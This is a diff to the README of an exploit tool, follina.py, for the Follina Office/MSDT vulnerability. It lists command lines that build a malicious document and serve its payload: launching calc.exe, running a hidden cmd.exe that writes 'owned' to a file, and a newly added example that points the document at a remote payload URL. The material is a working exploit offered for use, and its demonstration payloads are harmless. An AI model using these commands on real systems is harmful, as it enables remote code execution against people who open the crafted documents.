@@ -42,11 +42,12 @@ python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe
 # Execute an arbitrary powershell command
 python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"
 
-# Run the web server on the default interface (all interfaces, 0.0.0.0), but tell the malicious document to retrieve it at http://1.2.3.4/exploit.html
-python .\follina.py -m binary -b \windows\system32\calc.exe -u 1.2.3.4
+# Create the malicious document with a custom payload URL, no webserver
+python .\follina.py -m url -u http://example.com/payload.html
 
 # Only run the webserver on localhost, on port 8080 instead of 80
 python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080
+
 ```
 
 ## Cool peeps
